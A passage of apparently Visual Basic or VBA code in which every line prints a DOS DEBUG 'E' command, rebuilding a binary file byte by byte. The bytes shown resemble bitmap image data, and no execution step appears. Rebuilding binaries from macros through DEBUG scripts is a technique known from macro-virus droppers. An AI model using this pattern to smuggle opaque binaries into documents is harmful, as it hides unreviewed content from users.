Print #hFile, "E 30A0 53 5A 4D 56 5F 2F AB AB 09 F7 EF 09 F7 EF 41 82"
Print #hFile, "E 30B0 86 5D 62 6B 6C 71 7A 26 DA D7 09 F7 EF 09 F7 EF"
Print #hFile, "E 30C0 3D 8C 90 49 50 59 5E 67 70 4C 55 5E 46 8A 8E 09"
Print #hFile, "E 30D0 F7 EF 09 F7 EF 09 F7 EF 60 6B 73 58 63 6B 56 5D"
Print #hFile, "E 30E0 66 51 67 6F 09 F7 EF 09 F7 EF 09 F7 EF 5A 66 6C"
Print #hFile, "E 30F0 56 5F 63 4F 55 5A 40 43 47 06 5F 5E 09 F7 EF 09"
Print #hFile, "E 3100 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7"
Print #hFile, "E 3110 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF"
Print #hFile, "E 3120 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09"
Print #hFile, "E 3130 F7 EF 2A E1 EB 8F A1 E2 4E CE EB 09 F7 EF 09 F7"
Print #hFile, "E 3140 EF 09 F7 EF 2C E1 EC 99 A0 E5 8E 94 CF 87 8D BA"
Print #hFile, "E 3150 CD D4 EF F6 FC FF FA FF FF FA FF FB FD FF FE E8"
Print #hFile, "E 3160 ED EC 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7"
Print #hFile, "E 3170 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 E9 E1"
Print #hFile, "E 3180 04 04 04 00 00 01 0F 12 16 43 49 4E 4D 55 5C 4F"
Print #hFile, "E 3190 57 5E 4F 58 5C 18 CD C8 09 F7 EF 09 F7 EF 09 F7"
Print #hFile, "E 31A0 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF"
Print #hFile, "E 31B0 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 0A CE C7 18"
Print #hFile, "E 31C0 5A 58 2C 31 34 37 3C 3F 3F 43 48 3D 43 48 44 4D"
Print #hFile, "E 31D0 50 46 4F 52 45 4C 4F 46 4B 4E 49 4E 51 01 06 09"
Print #hFile, "E 31E0 00 00 F3 F6 F4 EB EE EC DD DF DF CC CE CE BE C2"
Print #hFile, "E 31F0 C3 B9 BD BE 00 00 03 48 4D 50 73 79 7E 75 7B 80"
Print #hFile, "E 3200 5D 65 6C 4F 57 5E 4C 55 5E 1F C6 C3 09 F7 EF 09"
Print #hFile, "E 3210 F7 EF 44 84 89 63 68 71 6B 70 79 35 BE BD 09 F7"
Print #hFile, "E 3220 EF 09 F7 EF 37 B2 B2 61 68 71 65 6E 77 4D 56 5F"
Print #hFile, "E 3230 43 95 98 09 F7 EF 09 F7 EF 18 DC D7 62 6F 77 53"
Print #hFile, "E 3240 5E 66 55 5C 65 52 59 62 09 F7 EF 09 F7 EF 09 F7"
Print #hFile, "E 3250 EF 5F 69 70 55 5E 62 4D 53 58 33 36 3A 06 23 25"
Print #hFile, "E 3260 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09"
Print #hFile, "E 3270 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7"
Print #hFile, "E 3280 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF"
Print #hFile, "E 3290 09 F7 EF 09 F7 EF 2A E1 EB 8E A0 E1 4A CB E7 09"
Print #hFile, "E 32A0 F7 EF 09 F7 EF 09 F7 EF 2B DF EB 90 96 DD 93 99"
Print #hFile, "E 32B0 DA 7C 82 B7 B7 BE DF F0 F8 FF F8 FF FF F8 FE F9"
Print #hFile, "E 32C0 FD FF FC F8 FB F9 3A ED E8 09 F7 EF 09 F7 EF 09"
Print #hFile, "E 32D0 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7"
Print #hFile, "E 32E0 EF 09 F7 EF 08 60 5D 00 00 00 00 00 01 43 48 4B"
Print #hFile, "E 32F0 53 59 5E 4D 55 5C 49 52 56 19 CE C9 09 F7 EF 09"
Print #hFile, "E 3300 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7"
Print #hFile, "E 3310 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF"
Print #hFile, "E 3320 09 F7 EF 09 F7 EF 14 8E 8C 29 2E 31 37 3B 40 3D"
Print #hFile, "E 3330 43 48 3C 45 48 3D 46 49 42 49 4C 4A 4F 52 4D 52"
Print #hFile, "E 3340 55 00 03 06 00 00 F4 F7 F5 E9 EC EA DE E0 E0 CF"
Print #hFile, "E 3350 D1 D1 BC C0 C1 B8 BC BD 00 00 03 46 4B 4E 61 67"
Print #hFile, "E 3360 6C 75 7B 80 66 6E 75 56 5E 65 53 5C 65 1B D0 CD"
Print #hFile, "E 3370 09 F7 EF 09 F7 EF 4E 8E 93 5D 62 6B 6B 70 79 4C"
Print #hFile, "E 3380 A8 AB 09 F7 EF 09 F7 EF 1D D2 CE 5B 62 6B 55 5E"
Print #hFile, "E 3390 67 5C 65 6E 33 B0 B0 09 F7 EF 09 F7 EF 1E D4 D0"
Print #hFile, "E 33A0 63 70 78 57 62 6A 4D 56 5F 63 6A 73 09 F7 EF 09"
Print #hFile, "E 33B0 F7 EF 09 F7 EF 43 87 8A 58 61 65 50 54 59 3B 3C"
Print #hFile, "E 33C0 40 00 00 03 08 CA C3 09 F7 EF 09 F7 EF 09 F7 EF"
Print #hFile, "E 33D0 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09"
Print #hFile, "E 33E0 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7"
Print #hFile, "E 33F0 EF 09 F7 EF 09 F7 EF 09 F7 EF 2A E2 EC 90 A2 E1"
Print #hFile, "E 3400 49 CB E7 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 8A"
Print #hFile, "E 3410 91 DA 93 9A DF 84 8B C4 88 90 B8 E9 F4 FF F4 FE"
Print #hFile, "E 3420 FF F8 FF FC F7 FB F5 FF FF FC 44 F7 F2 09 F7 EF"
Print #hFile, "E 3430 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09"
Print #hFile, "E 3440 F7 EF 09 F7 EF 09 F7 EF 08 D9 D2 00 00 00 06 08"
Print #hFile, "E 3450 09 31 36 39 50 56 5B 40 49 4D 3C 47 4B 15 CB C6"
Print #hFile, "E 3460 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09"
Print #hFile, "E 3470 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7"
Print #hFile, "E 3480 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 1F 8A 8A"
Print #hFile, "E 3490 2D 33 3A 39 3F 44 32 3B 3E 38 41 44 46 4D 50 4F"
Print #hFile, "E 34A0 54 57 4A 4F 52 00 00 03 00 00 F4 F7 F5 E8 EB E9"
Print #hFile, "E 34B0 DE E0 E0 D1 D3 D3 BD C1 C2 B5 B9 BA 00 00 03 4A"
Print #hFile, "E 34C0 4F 52 5C 62 67 7A 80 85 6E 76 7D 55 5D 64 54 5D"
Print #hFile, "E 34D0 66 1D D3 CF 09 F7 EF 09 F7 EF 60 67 70 5C 61 6A"
Print #hFile, "E 34E0 6D 72 7B 61 91 97 09 F7 EF 09 F7 EF 0E EE E7 5C"
Print #hFile, "E 34F0 63 6C 4F 58 61 52 5B 64 1F C7 C4 09 F7 EF 09 F7"
Print #hFile, "E 3500 EF 27 C0 BE 62 6D 75 5A 65 6D 4B 54 5D 5D 66 6F"
Print #hFile, "E 3510 19 DD D8 09 F7 EF 09 F7 EF 48 8A 8D 59 5F 64 4C"
Print #hFile, "E 3520 50 55 29 2A 2E 02 00 03 08 5F 5D 09 F7 EF 09 F7"
Print #hFile, "E 3530 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF"
Print #hFile, "E 3540 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09"
Print #hFile, "E 3550 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 29 E1"
Print #hFile, "E 3560 EB 8D 9F DE 4A CB E7 09 F7 EF 09 F7 EF 09 F7 EF"
Print #hFile, "E 3570 09 F7 EF 91 98 E1 90 98 DE 83 8C CB 88 92 C1 D8"
Print #hFile, "E 3580 E2 FF F0 FA FF F8 FF FF FD FF FC FD FE FA 64 F9"
Print #hFile, "E 3590 F5 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF"
Print #hFile, "E 35A0 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 04"
Print #hFile, "E 35B0 5E 5A 00 00 01 21 26 27 4C 52 57 47 50 54 47 52"
Print #hFile, "E 35C0 56 1C C4 C0 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF"
Print #hFile, "E 35D0 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09"
Print #hFile, "E 35E0 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7"
Print #hFile, "E 35F0 EF 1F 9A 9A 33 3B 42 21 29 30 37 42 46 3F 48 4B"
Print #hFile, "E 3600 44 4B 4E 49 4E 51 43 48 4B 00 00 03 00 00 F5 F8"
Print #hFile, "E 3610 F6 E7 EA E8 DE E0 E0 D2 D4 D4 BE C2 C3 B2 B6 B7"
Print #hFile, "E 3620 00 00 03 54 59 5C 43 49 4E 6A 70 75 70 78 7F 53"
Print #hFile, "E 3630 5B 62 4A 53 5C 0D EE E7 09 F7 EF 09 F7 EF 57 5E"
Print #hFile, "E 3640 67 55 5C 65 69 70 79 71 78 81 09 F7 EF 09 F7 EF"
Print #hFile, "E 3650 09 F7 EF 4E 72 79 52 5B 64 50 59 62 0D ED E6 09"
Print #hFile, "E 3660 F7 EF 09 F7 EF 2E AA AA 5E 67 70 5A 63 6C 4A 53"
Print #hFile, "E 3670 5C 56 5F 68 1D D2 CF 09 F7 EF 09 F7 EF 33 AE AD"
Print #hFile, "E 3680 54 5A 5F 45 48 4D 28 27 2B 09 05 0A 04 0F 10 08"
Print #hFile, "E 3690 C9 C3 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7"
Print #hFile, "E 36A0 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF"
Print #hFile, "E 36B0 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09"
Print #hFile, "E 36C0 F7 EF 2A E1 EA 8C 9D DC 4B CB E7 09 F7 EF 09 F7"
Print #hFile, "E 36D0 EF 09 F7 EF 09 F7 EF 93 9B E1 8E 96 DC 88 91 D4"
Print #hFile, "E 36E0 88 94 CA B5 C0 E6 ED F7 FF F6 FF FF FD FF FE FB"
Print #hFile, "E 36F0 FA F6 83 FB F7 09 F7 EF 09 F7 EF 09 F7 EF 09 F7"
Print #hFile, "E 3700 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF"
Print #hFile, "E 3710 09 F7 EF 09 E9 E1 01 10 10 12 16 17 43 49 4E 48"
Print #hFile, "E 3720 51 55 4A 54 5B 32 92 93 09 F7 EF 09 F7 EF 09 F7"
Print #hFile, "E 3730 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF"
Print #hFile, "E 3740 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09"
Print #hFile, "E 3750 F7 EF 09 F7 EF 12 C8 C3 38 41 4A 1F 28 31 34 3F"
Print #hFile, "E 3760 43 3F 48 4B 41 48 4B 45 4A 4D 3D 42 45 00 00 03"
Print #hFile, "E 3770 00 00 F7 FA F8 E8 EB E9 DC DE DE D2 D4 D4 BF C3"
Print #hFile, "E 3780 C4 B1 B5 B6 00 01 04 64 69 6C 3B 41 46 56 5C 61"
Print #hFile, "E 3790 73 7B 82 65 6D 74 4C 55 5E 09 F7 EF 09 F7 EF 09"
Print #hFile, "E 37A0 F7 EF 4E 55 5E 51 58 61 64 6B 74 69 70 79 1C D1"
Print #hFile, "E 37B0 CD 09 F7 EF 09 F7 EF 35 92 95 59 62 6B 47 7B 80"
Print #hFile, "E 37C0 09 F7 EF 09 F7 EF 09 F7 EF 35 95 97 5A 63 6C 56"
Print #hFile, "E 37D0 5F 68 4F 58 61 53 5C 65 1A D0 CC 09 F7 EF 09 F7"
Print #hFile, "E 37E0 EF 2F AB AA 4D 53 58 3E 41 46 1A 19 1D 02 00 03"
Print #hFile, "E 37F0 04 00 01 0C 16 17 28 BD B8 09 F7 EF 09 F7 EF 09"
Print #hFile, "E 3800 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7"
Print #hFile, "E 3810 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF"
Print #hFile, "E 3820 09 F7 EF 09 F7 EF 2A E0 EA 90 9F DE 4B CB E8 09"
Print #hFile, "E 3830 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 8F 98 DC 89 93"
Print #hFile, "E 3840 D9 8D 98 DC 88 93 CF 8D 9A C8 E1 EC FF F5 FB FF"
Print #hFile, "E 3850 FD FF FF FE FD F9 84 FA F6 09 F7 EF 09 F7 EF 09"
Print #hFile, "E 3860 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7"
Print #hFile, "E 3870 EF 09 F7 EF 09 F7 EF 09 F7 EF 06 7E 7A 03 07 08"
Print #hFile, "E 3880 35 3C 3F 40 49 4D 42 4C 53 3A 6F 73 09 F7 EF 09"
Print #hFile, "E 3890 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7"
Print #hFile, "E 38A0 EF 1D 7B 78 11 C7 C0 09 F7 EF 09 F7 EF 09 F7 EF"
Print #hFile, "E 38B0 09 F7 EF 09 F7 EF 09 F7 EF 17 CE CA 47 53 5D 16"
Print #hFile, "E 38C0 23 2B 24 2F 33 37 40 43 3E 45 48 46 4B 4E 3E 43"
Print #hFile, "E 38D0 46 00 00 03 00 00 F8 FB F9 E9 EC EA DC DE DE D1"
Print #hFile, "E 38E0 D3 D3 BF C3 C4 B2 B6 B7 01 06 09 70 75 78 4E 54"
Print #hFile, "E 38F0 59 45 4B 50 66 6E 75 6E 76 7D 4E 57 60 09 F7 EF"
Print #hFile, "E 3900 09 F7 EF 09 F7 EF 4A 53 5C 52 5B 64 61 6A 73 5F"
Print #hFile, "E 3910 68 71 29 B3 B3 09 F7 EF 09 F7 EF 25 AF AF 55 5C"
Print #hFile, "E 3920 65 2A B3 B3 09 F7 EF 09 F7 EF 09 F7 EF 41 82 87"
Print #hFile, "E 3930 5C 63 6C 53 5C 65 59 62 6B 57 62 6A 1E C5 C2 09"
Print #hFile, "E 3940 F7 EF 09 F7 EF 1F C6 C2 4D 51 56 3E 3E 44 1B 1A"
Print #hFile, "E 3950 1E 02 00 03 04 00 01 0D 08 0A A1 9F 9F 3A ED E7"
Print #hFile, "E 3960 09 F7 EF 09 F7 EF 63 FA F5 7D F7 F4 7F F8 F3 82"
Print #hFile, "E 3970 FA F6 80 F8 F7 7F F8 F7 54 CE DF 39 B5 CE 47 C3"
Print #hFile, "E 3980 E1 4A C7 E6 09 F7 EF 09 F7 EF 2B E1 EB 95 A1 E1"
Print #hFile, "E 3990 5C BF E5 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 90"
Print #hFile, "E 39A0 9A DA 89 94 D8 8E 9B DF 89 95 D5 7B 88 BC C2 CD"
Print #hFile, "E 39B0 ED F4 FB FF FA FC FD FF FF FC 84 F8 F5 09 F7 EF"
Print #hFile, "E 39C0 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 08 DA D3 07"
Print #hFile, "E 39D0 BA B4 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 E9"
Print #hFile, "E 39E0 E1 01 10 10 2B 30 33 3B 44 48 40 4A 51 44 4E 55"
Print #hFile, "E 39F0 30 66 6A 18 95 93 0E A5 A0 09 F7 EF 09 F7 EF 09"
Print #hFile, "E 3A00 F7 EF 09 F7 EF 27 68 66 27 32 30 14 91 8C 09 F7"
Print #hFile, "E 3A10 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 1F D6 D3"
Print #hFile, "E 3A20 5C 6C 78 2D 3C 45 1B 27 2B 2F 38 3B 3E 45 48 48"
Print #hFile, "E 3A30 4D 50 3F 44 47 00 02 05 00 00 F6 F9 F7 EB EE EC"
Print #hFile, "E 3A40 DC DE DE CF D1 D1 BF C3 C4 B3 B7 B8 01 06 09 72"
Print #hFile, "E 3A50 77 7A 69 6F 74 44 4A 4F 51 59 60 62 6A 71 40 74"
Print #hFile, "E 3A60 7A 09 F7 EF 09 F7 EF 11 E4 DE 4D 56 5F 5B 64 6D"
Print #hFile, "E 3A70 60 69 72 58 61 6A 34 A2 A4 09 F7 EF 09 F7 EF 11"
Print #hFile, "E 3A80 E3 DD 49 50 59 11 E3 DD 09 F7 EF 09 F7 EF 09 F7"
Print #hFile, "E 3A90 EF 44 77 7C 5B 62 6B 50 57 60 5C 65 6E 5B 66 6E"
Print #hFile, "E 3AA0 29 A6 A6 09 F7 EF 09 F7 EF 19 CE CA 4C 50 55 3D"
Print #hFile, "E 3AB0 3D 43 23 22 26 06 00 05 09 02 05 23 1E 20 BD B8"
Print #hFile, "E 3AC0 B9 5C E2 DE 09 F7 EF 09 F7 EF B7 F8 F9 EF F6 F9"
Print #hFile, "E 3AD0 F7 FC FA F0 F5 F4 FA FC FF E3 E6 FF 76 7C AB 74"
Print #hFile, "E 3AE0 7E BA 85 90 D4 89 95 DB 09 F7 EF 09 F7 EF 2C E2"
Print #hFile, "E 3AF0 EB 97 A3 E3 6D B4 E3 09 F7 EF 09 F7 EF 09 F7 EF"
Print #hFile, "E 3B00 09 F7 EF 94 A1 DF 8A 98 DA 8C 98 DE 8B 98 DC 80"
Print #hFile, "E 3B10 8C C6 9B A4 CA F4 F9 FF FC FC FF FF FF FE 83 FB"
Print #hFile, "E 3B20 F6 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF"
Print #hFile, "E 3B30 07 BA B6 00 00 03 05 3E 3C 09 E9 E1 09 F7 EF 09"
Print #hFile, "E 3B40 F7 EF 09 F7 EF 04 7C 78 2A 2F 32 3C 45 49 42 4A"
Print #hFile, "E 3B50 51 40 4A 51 38 44 4A 27 32 36 0D 4E 4B 09 F7 EF"
Print #hFile, "E 3B60 09 F7 EF 09 F7 EF 09 F7 EF 23 65 61 25 30 2E 20"
Print #hFile, "E 3B70 2D 2B 22 4B 4B 14 CB C6 09 F7 EF 09 F7 EF 09 F7"
Print #hFile, "E 3B80 EF 1A D1 CE 49 5A 67 4A 5A 66 22 2E 34 2C 35 38"
Print #hFile, "E 3B90 3C 43 46 44 49 4C 39 3E 41 00 04 07 00 00 F2 F5"
Print #hFile, "E 3BA0 F3 EC EF ED DD DF DF CE D0 D0 BF C3 C4 B2 B6 B7"
Print #hFile, "E 3BB0 00 01 04 6A 6F 72 77 7D 82 5A 60 65 4E 56 5D 55"
Print #hFile, "E 3BC0 5D 64 3F 81 86 09 F7 EF 09 F7 EF 1B D1 CD 4B 56"
Print #hFile, "E 3BD0 5E 5E 69 71 5A 65 6D 4D 58 60 47 7D 82 09 F7 EF"
Print #hFile, "E 3BE0 09 F7 EF 09 F7 EF 1E C4 C2 09 F7 EF 09 F7 EF 09"
Print #hFile, "E 3BF0 F7 EF 09 F7 EF 4A 4F 58 54 59 62 43 4A 53 50 59"
Print #hFile, "E 3C00 62 55 60 68 27 A4 A4 09 F7 EF 09 F7 EF 0C ED E6"
Print #hFile, "E 3C10 45 49 4E 34 34 3A 16 12 17 04 00 03 0E 07 0A 7B"
Print #hFile, "E 3C20 76 78 E2 DD DE 78 F0 EC 09 F7 EF 09 F7 EF AF F2"
Print #hFile, "E 3C30 F3 F5 FC FF F8 FD FB F3 F8 F7 FA FB FF B5 B7 D6"
Print #hFile, "E 3C40 69 6D A2 7E 86 C9 81 8B D1 88 94 DA 09 F7 EF 09"
Print #hFile, "E 3C50 F7 EF 2C E2 EB 95 9F DF 6D B2 E1 09 F7 EF 09 F7"
Print #hFile, "E 3C60 EF 09 F7 EF 09 F7 EF 94 A2 DC 8D 9B DD 87 96 DB"
Print #hFile, "E 3C70 8A 98 E0 87 94 D2 83 8C B8 DB E0 F9 FF FC FF FF"
Print #hFile, "E 3C80 FC FB 84 FB F7 09 F7 EF 09 F7 EF 09 F7 EF 09 F7"
Print #hFile, "E 3C90 EF 09 F7 EF 07 BA B6 00 00 03 04 00 00 07 2F 2D"
Print #hFile, "E 3CA0 09 E8 E1 09 F7 EF 09 F7 EF 09 E9 E1 25 39 3B 35"
Print #hFile, "E 3CB0 3E 42 3A 42 49 36 40 47 36 42 48 29 34 38 0F 4F"
Print #hFile, "E 3CC0 4D 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 19 5B 57"
Print #hFile, "E 3CD0 1F 2A 28 28 35 33 34 41 43 31 40 43 2D 75 78 0F"
Print #hFile, "E 3CE0 B8 B5 0A EB E4 2A 82 88 33 46 55 3B 4C 59 2A 38"
Print #hFile, "E 3CF0 3E 28 31 34 36 3D 40 39 3E 41 2E 33 36 00 02 05"
Print #hFile, "E 3D00 00 00 F1 F1 F1 EC EE EE DE E0 E0 CD CF CF C1 C3"
Print #hFile, "E 3D10 C3 B1 B6 B5 00 00 01 60 65 68 68 6F 72 63 69 6E"
Print #hFile, "E 3D20 4A 52 59 45 4D 54 3A 7D 80 09 F7 EF 09 F7 EF 19"
Print #hFile, "E 3D30 CF CA 47 52 5A 5B 68 70 54 5F 67 44 4F 57 55 60"
Print #hFile, "E 3D40 68 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF"
Print #hFile, "E 3D50 09 F7 EF 09 F7 EF 0C EC E5 40 45 4E 49 4E 57 38"
Print #hFile, "E 3D60 3D 46 40 49 52 4B 56 5E 24 A1 A1 09 F7 EF 09 F7"
Print #hFile, "E 3D70 EF 09 F7 EF 3D 41 46 29 2A 2E 14 13 17 02 00 01"
Print #hFile, "E 3D80 04 00 01 C1 BC BD F3 F1 F1 84 FB F7 09 F7 EF 09"
Print #hFile, "E 3D90 F7 EF B5 F7 F5 F8 FF FF F7 FD FC F8 FE FF ED F2"
Print #hFile, "E 3DA0 FF 84 89 B0 6A 70 AB 7F 88 CB 7B 88 CC 85 95 D7"
Print #hFile, "E 3DB0 09 F7 EF 09 F7 EF 2B E0 EA 91 9C DA 7C A5 DB 09"
Print #hFile, "E 3DC0 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 6C B3 DC 8F 9E"
Print #hFile, "E 3DD0 DC 86 96 D8 87 96 DB 89 96 D4 80 8A BA B8 BD DC"
Print #hFile, "E 3DE0 F8 FA FF FC FA FA 83 F9 F3 09 F7 EF 09 F7 EF 09"
Print #hFile, "E 3DF0 F7 EF 09 F7 EF 09 F7 EF 07 BA B5 00 00 03 03 01"
Print #hFile, "E 3E00 01 04 00 00 06 6C 69 09 F7 EF 09 F7 EF 09 F7 EF"
Print #hFile, "E 3E10 13 8D 8A 28 31 35 2F 38 3C 30 3B 3F 3C 47 4B 35"
Print #hFile, "E 3E20 3E 41 12 52 50 09 F7 EF 09 F7 EF 09 F7 EF 09 F7"
Print #hFile, "E 3E30 EF 13 58 55 17 25 24 2A 37 39 1F 2E 31 2D 3D 43"
Print #hFile, "E 3E40 4C 5C 62 3E 50 57 1E 30 3B 3E 51 5E 48 5C 6D 3D"
Print #hFile, "E 3E50 50 5F 2A 3A 41 1F 2B 2F 2F 38 3C 30 36 3B 24 2B"
Print #hFile, "E 3E60 2E 00 00 01 00 00 F7 F4 F6 ED ED ED DE DE DE CF"
Print #hFile, "E 3E70 D2 D0 C5 C8 C6 B6 BB B9 00 01 00 5C 62 61 56 5D"
Print #hFile, "E 3E80 60 5E 65 68 58 61 65 35 3E 42 24 A1 9F 09 F7 EF"
Print #hFile, "E 3E90 09 F7 EF 1A D1 CB 53 5E 66 60 6A 74 58 62 6C 50"
Print #hFile, "E 3EA0 5A 64 4B 54 5E 1A CF CC 09 F7 EF 09 F7 EF 09 F7"
Print #hFile, "E 3EB0 EF 09 F7 EF 09 F7 EF 09 F7 EF 1B CF CB 49 4B 56"
Print #hFile, "E 3EC0 42 44 4F 42 47 50 42 4B 54 41 4D 53 25 93 93 09"
Print #hFile, "E 3ED0 F7 EF 09 F7 EF 09 F7 EF 29 5A 5B 27 2A 2E 08 09"
Print #hFile, "E 3EE0 0D 05 07 08 04 03 05 F2 F0 F0 FF FD FD 7F F5 F1"
Print #hFile, "E 3EF0 09 F7 EF 09 F7 EF BC FB F4 EF F6 F3 F3 FC FF F3"
Print #hFile, "E 3F00 FA FF B8 C1 E6 54 5F 91 75 80 BE 7B 89 CB 7F 91"
Print #hFile, "E 3F10 CC 82 95 CE 28 E0 E8 09 F7 EF 29 E0 E9 8F 9C DA"
Print #hFile, "E 3F20 8E 9F D8 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 6B"
Print #hFile, "E 3F30 B4 DC 89 9C D5 88 9C D5 89 9B D8 8B 9B D6 86 91"
Print #hFile, "E 3F40 C5 8B 94 BA F0 F8 FF F5 FD FD 80 FB F3 09 F7 EF"
Print #hFile, "E 3F50 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 07 BC B8 00"
Print #hFile, "E 3F60 04 09 00 00 01 03 04 02 04 01 00 08 BA B4 09 F7"
Print #hFile, "E 3F70 EF 09 F7 EF 0A DC D5 25 2E 31 29 32 35 27 30 33"
Print #hFile, "E 3F80 30 35 38 34 39 3A 18 59 57 09 F7 EF 09 F7 EF 09"
Print #hFile, "E 3F90 F7 EF 09 F7 EF 0B 53 53 0A 1A 20 07 17 1E 17 26"
Print #hFile, "E 3FA0 2F 3C 4C 53 4C 5C 63 42 54 5B 41 53 5E 34 47 54"
Print #hFile, "E 3FB0 4C 60 72 68 7C 8E 4B 5D 68 1F 2E 37 1E 2D 36 10"
Print #hFile, "E 3FC0 1C 22 30 39 3C 00 01 00 00 00 F7 F4 F6 EE EE EE"
Print #hFile, "E 3FD0 DF E0 DE CF D2 D0 C4 C8 C3 B6 BC B7 00 01 00 60"
Print #hFile, "E 3FE0 66 65 5E 65 68 5C 65 69 67 70 74 4F 5A 5E 24 A1"
Print #hFile, "E 3FF0 9F 09 F7 EF 09 F7 EF 18 CF C9 57 62 6A 60 69 73"
Print #hFile, "E 4000 51 5A 64 43 4C 56 47 50 5A 30 AA AC 09 F7 EF 09"
Print #hFile, "E 4010 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 1C CF"
Print #hFile, "E 4020 CC 4E 50 5A 44 45 4F 35 37 41 45 4D 54 39 43 4A"
Print #hFile, "E 4030 24 68 69 09 F7 EF 09 F7 EF 09 F7 EF 2B 6B 6B 24"
Print #hFile, "E 4040 29 2C 0A 0E 0F 00 00 01 8C 8E 8E FC FC FC F7 F5"
Print #hFile, "E 4050 F4 AA F4 F0 09 F7 EF 09 F7 EF BC FB F1 F8 FF FA"
Print #hFile, "E 4060 F4 FD FF ED F7 FF 85 90 BC 54 60 9A 77 85 C7 7E"
Print #hFile, "E 4070 8E D0 7E 92 CB 7C 90 C7 27 DE E6 09 F7 EF 2B E2"
Print #hFile, "E 4080 EB 8F 9E DC 8A 9B D3 09 F7 EF 09 F7 EF 09 F7 EF"
Print #hFile, "E 4090 09 F7 EF 68 B0 D9 84 98 CF 84 99 D0 88 9A D5 8B"
Print #hFile, "E 40A0 9B D6 89 94 CD 81 8C B8 C3 D0 E6 F3 FF FF 52 F9"
Print #hFile, "E 40B0 F1 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF"
Print #hFile, "E 40C0 09 BF BB 00 00 04 00 00 01 00 01 00 06 02 01 07"
Print #hFile, "E 40D0 41 3C 09 F7 EF 09 F7 EF 09 F7 EF 0C 4F 4D 16 1F"
Print #hFile, "E 40E0 22 1A 23 26 23 26 2A 23 28 29 16 57 55 09 F7 EF"
Print #hFile, "E 40F0 09 F7 EF 09 F7 EF 09 F7 EF 03 45 47 11 22 2B 25"
Print #hFile, "E 4100 35 41 35 43 4F 44 53 5C 46 56 5D 44 56 5D 46 59"
Print #hFile, "E 4110 61 3D 50 5D 4E 62 74 57 6B 7D 62 75 84 38 4A 55"
Print #hFile, "E 4120 0C 1C 28 15 25 2C 3D 49 4B 00 01 00 00 00 F5 F5"
Print #hFile, "E 4130 F5 EC EE EE DD E0 DE CC D1 CF C1 C7 C2 B4 BB B6"
Print #hFile, "E 4140 00 03 00 63 6B 6B 68 6E 73 5D 65 6C 69 70 79 57"
Print #hFile, "E 4150 60 69 18 BF BC 09 F7 EF 09 F7 EF 1E B8 B5 51 5A"
Print #hFile, "E 4160 63 5B 61 6C 4E 54 5F 41 47 52 4B 52 5B 46 85 8A"
Print #hFile, "E 4170 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09"
Print #hFile, "E 4180 F7 EF 26 9F 9E 55 58 5D 4E 51 56 32 36 3B 32 3B"
Print #hFile, "E 4190 3F 39 42 46 24 66 67 09 F7 EF 09 F7 EF 09 F7 EF"
Print #hFile, "E 41A0 22 61 61 23 28 2B 00 00 01 35 39 3A F7 F9 F9 F6"
